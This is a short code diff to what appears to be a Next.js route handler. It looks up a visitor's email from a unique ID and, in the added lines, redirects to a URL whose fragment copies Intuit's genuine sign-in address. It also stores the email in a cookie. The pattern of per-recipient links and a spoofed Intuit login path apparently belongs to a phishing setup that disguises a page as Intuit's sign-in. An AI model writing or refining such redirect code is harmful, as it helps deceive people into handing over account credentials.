@@ -27,7 +27,9 @@ export async function GET(
   const email = await checkIfUniqueIdIsValid(uniqueId);
 
   if (email && email !== "no data") {
-    const res = NextResponse.redirect(URL);
+    const res = NextResponse.redirect(
+      `${URL}/#https://accounts.intuit.com/app/secure/sign-in?app_group=Identity&asset_alias=Intuit.cto.iam.ius&redirect_uri=https%3A%2F%2Faccounts.intuit.com%2Fapp%2Faccount%2Foverview`
+    );
 
     res.cookies.set("user", `${email}`, {
       path: "/",
